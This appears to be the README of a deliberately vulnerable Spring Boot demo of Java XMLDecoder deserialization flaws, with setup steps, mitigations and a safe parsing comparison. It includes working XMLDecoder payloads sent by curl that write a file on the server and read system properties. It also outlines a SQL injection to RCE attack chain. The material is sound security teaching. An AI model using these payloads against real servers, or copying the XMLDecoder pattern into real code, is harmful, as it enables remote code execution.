# XMLDecoder Vulnerability Demonstration

⚠️ **WARNING: This application is intentionally vulnerable and is for educational purposes only. Never deploy this to production or expose it to the internet.**

## Overview

This Spring Boot application demonstrates how Java's XMLDecoder can be exploited for Remote Code Execution (RCE) attacks. XMLDecoder vulnerabilities have been responsible for some of the most severe enterprise security breaches, including critical Oracle WebLogic vulnerabilities (CVE-2017-10271, CVE-2019-2725, and others).

## What You'll Learn

- How XMLDecoder processes XML and instantiates Java objects
- The difference between safe XML parsing and dangerous deserialization
- Why XMLDecoder vulnerabilities are so devastating in enterprise environments
- How attackers can disguise malicious payloads as legitimate business data
- The importance of vulnerability chaining in real-world attacks

## The Vulnerability

XMLDecoder treats XML as **instructions for Java object construction**, not just data. When an application uses XMLDecoder to process untrusted XML input, attackers can:

- Execute arbitrary system commands
- Read/write files on the server
- Download and execute malware
- Pivot to internal network resources
- Achieve complete system compromise

## Setup Instructions

### Prerequisites
- Java 11 or higher
- Maven 3.6+

### Running the Demo

1. **Clone and build:**
   ```bash
   git clone <your-repo-url>
   cd xmldecoder-demo
   mvn clean package
   ```

2. **Start the application:**
   ```bash
   java -jar target/xmldecoder-demo-1.0.0.jar
   ```
   
   Or with Maven:
   ```bash
   mvn spring-boot:run
   ```

3. **Access the demo:**
   - Open http://localhost:8080 in your browser
   - Use the provided curl examples to test different scenarios

## Test Scenarios

### 1. Legitimate Use Case

**Export a customer object:**
```bash
curl -X POST 'http://localhost:8080/api/customer/export?name=John%20Doe&email=john@example.com&id=12345'
```

**Import the legitimate XML:**
```bash
curl -X POST http://localhost:8080/api/customer/legitimate-import \
  -H 'Content-Type: application/xml' \
  -d '[paste the XML output from export command]'
```

### 2. Safe XML Processing (for comparison)

```bash
curl -X POST http://localhost:8080/api/customer/safe-import \
  -H 'Content-Type: application/xml' \
  -d '<customer><name>John</name><email>john@example.com</email></customer>'
```

### 3. Vulnerability Demonstrations

⚠️ **These examples demonstrate the vulnerability - use only in isolated test environments**

**Simple string creation:**
```bash
curl -X POST http://localhost:8080/api/customer/import \
  -H 'Content-Type: application/xml' \
  -d '<java><object class="java.lang.String"><string>Hello World</string></object></java>'
```

**File creation (proof of concept):**
```bash
curl -X POST http://localhost:8080/api/customer/import \
  -H 'Content-Type: application/xml' \
  -d '<java><object class="java.io.FileWriter"><string>test-file.txt</string><void method="write"><string>XMLDecoder was here!</string></void><void method="close"/></object></java>'
```

**System property access:**
```bash
curl -X POST http://localhost:8080/api/customer/import \
  -H 'Content-Type: application/xml' \
  -d '<java><object class="java.lang.System" method="getProperty"><string>user.name</string></object></java>'
```

## Key Learning Points

### Why XMLDecoder is Dangerous

1. **Automatic Object Instantiation:** XMLDecoder can create instances of any accessible Java class
2. **Method Execution:** It can call any public method during deserialization
3. **No Security Boundaries:** There's no concept of "safe" vs "dangerous" classes
4. **Legitimate Appearance:** Malicious payloads can be disguised as normal business data

### Safe vs. Unsafe XML Processing

**❌ Unsafe (XMLDecoder):**
```java
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject(); // RCE vulnerability
```

**✅ Safe (DocumentBuilder):**
```java
DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document doc = builder.parse(inputStream); // Just parses structure
// You control object creation
```

### Real-World Attack Scenarios

- **Enterprise SOAP APIs** processing customer data
- **Configuration import/export** functionality
- **B2B data exchange** systems
- **Admin panels** with XML file upload
- **Legacy Java applications** using XMLDecoder for persistence

## Understanding the Attack Chain

This demo also illustrates how vulnerabilities can be chained together:

1. **Initial Access** (e.g., SQL injection to get admin credentials)
2. **Privilege Escalation** (use stolen credentials to access protected endpoints)
3. **Code Execution** (exploit XMLDecoder vulnerability with malicious payload)

Each step might appear secure in isolation, but combined they create a path to total system compromise.

## Historical Context

XMLDecoder vulnerabilities have been responsible for:

- **Oracle WebLogic Server** critical vulnerabilities (CVE-2017-10271, CVE-2019-2725)
- **Massive enterprise breaches** at Fortune 500 companies
- **Nation-state attack campaigns** targeting critical infrastructure
- **Cryptocurrency mining malware** deployed on corporate servers

## Mitigation Strategies

### Immediate Actions
- **Never use XMLDecoder with untrusted input**
- **Audit existing code** for XMLDecoder usage
- **Implement input validation** and authentication on all XML endpoints

### Long-term Solutions
- **Migrate to safer serialization** (JSON, Protocol Buffers)
- **Use proper XML parsing** libraries (DOM, SAX, StAX)
- **Implement defense-in-depth** security controls
- **Regular security assessments** including manual penetration testing

## File Structure

```
src/main/java/com/example/xmldemo/
├── VulnerableXmlController.java    # Main demo controller
└── Customer.java                   # JavaBean for legitimate use case
```

## Important Security Notes

🚨 **Never deploy this code to production environments**
🚨 **Run only on isolated, local systems**
🚨 **Do not expose to external networks**
🚨 **Use firewall rules to block external access to port 8080**

## Further Reading

- [Oracle Critical Patch Updates for WebLogic](https://www.oracle.com/security-alerts/)
- [Java Deserialization Security](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [XMLDecoder Security Issues](https://blog.h3xstream.com/2013/12/java-xml-decoder-deserialization.html)

## Contributing

This is an educational demonstration. If you find ways to improve the educational value or add additional test cases, please submit a pull request.

## License

This educational demonstration is provided for security research and training purposes. Use responsibly and ethically.
